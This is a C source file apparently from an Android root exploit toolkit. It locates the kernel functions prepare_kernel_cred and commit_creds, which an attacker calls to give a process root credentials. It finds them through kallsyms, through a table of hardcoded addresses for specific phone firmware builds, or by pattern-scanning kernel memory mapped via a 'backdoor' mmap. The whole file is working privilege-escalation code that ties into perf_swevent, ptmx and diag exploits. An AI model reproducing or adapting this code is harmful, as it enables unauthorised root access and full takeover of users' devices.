#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <sys/mman.h>

#include "detect_device.h"
#include "cred.h"
#include "mm.h"
#include "perf_swevent.h"
#include "ptmx.h"
#include "libdiagexploit/diag.h"
#include "kallsyms.h"
#include "backdoor_mmap.h"

typedef struct _supported_device {
  int device_id;
  unsigned long int prepare_kernel_cred_address;
  unsigned long int commit_creds_address;
} supported_device;

static supported_device supported_devices[] = {
  { DEV_IS17SH_01_00_04,   0xc01c66a8, 0xc01c5fd8 },
  { DEV_SH04E_01_00_02,    0xc008d86c, 0xc008d398 },
  { DEV_SOL21_9_1_D_0_395, 0xc0098584, 0xc00980a8 },
  { DEV_HTL21_JRO03C,      0xc00ab9d8, 0xc00ab4c4 },
};

static int n_supported_devices = sizeof(supported_devices) / sizeof(supported_devices[0]);

static bool
get_creds_functions_addresses(void **prepare_kernel_cred_address, void **commit_creds_address)
{
  int device_id = detect_device();
  int i;

  for (i = 0; i < n_supported_devices; i++) {
    if (supported_devices[i].device_id != device_id) {
      continue;
    }

    if (prepare_kernel_cred_address) {
      *prepare_kernel_cred_address = (void*)supported_devices[i].prepare_kernel_cred_address;
    }

    if (commit_creds_address) {
      *commit_creds_address = (void*)supported_devices[i].commit_creds_address;
    }

    return true;
  }

  return false;
}

static uint32_t prepare_kernel_cred_asm[] = { 0xe59f30bc, 0xe3a010d0, 0xe92d4070, 0xe1a04000 };
static size_t prepare_kernel_cred_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_prepare_kernel_cred(void *mem, size_t length)
{
  void *prepare_kernel_cred;

  prepare_kernel_cred = memmem(mem, length, &prepare_kernel_cred_asm, prepare_kernel_cred_asm_length);
  if (!prepare_kernel_cred) {
    printf("Couldn't find prepare_kernel_cred address\n");
    return NULL;
  }

  return prepare_kernel_cred;
}

static uint32_t commit_creds_asm[] = { 0xe92d4070, 0xe1a0200d, 0xe3c23d7f, 0xe1a05000 };
static size_t commit_creds_asm_length = sizeof(prepare_kernel_cred_asm);
static void *
find_commit_creds(void *mem, size_t length)
{
  void *commit_creds;

  commit_creds = memmem(mem, length, &commit_creds_asm, commit_creds_asm_length);
  if (!commit_creds) {
    printf("Couldn't find commit_creds address\n");
    return NULL;
  }

  return commit_creds;
}

static bool
find_creds_functions_with_backdoor(void)
{
  void *address;

  if (!backdoor_open_mmap()) {
    return false;
  }

  prepare_kernel_cred = find_prepare_kernel_cred((void *)BACKDOOR_MMAP_ADDRESS, BACKDOOR_MMAP_SIZE);
  if (prepare_kernel_cred) {
    commit_creds = find_commit_creds(prepare_kernel_cred + 4, BACKDOOR_MMAP_SIZE);

    prepare_kernel_cred = backdoor_convert_to_kernel_address(prepare_kernel_cred);
    commit_creds = backdoor_convert_to_kernel_address(commit_creds);
  }

  backdoor_close_mmap();

  return prepare_kernel_cred && commit_creds;
}

bool
setup_creds_functions(void)
{
  if (kallsyms_exist()) {
    prepare_kernel_cred = kallsyms_get_symbol_address("prepare_kernel_cred");
    commit_creds = kallsyms_get_symbol_address("commit_creds");
    return true;
  }

  if (get_creds_functions_addresses((void**)&prepare_kernel_cred, (void**)&commit_creds)) {
    return true;
  }

  if (find_creds_functions_with_backdoor()) {
    return true;
  }

  print_reason_device_not_supported();
  return false;
}

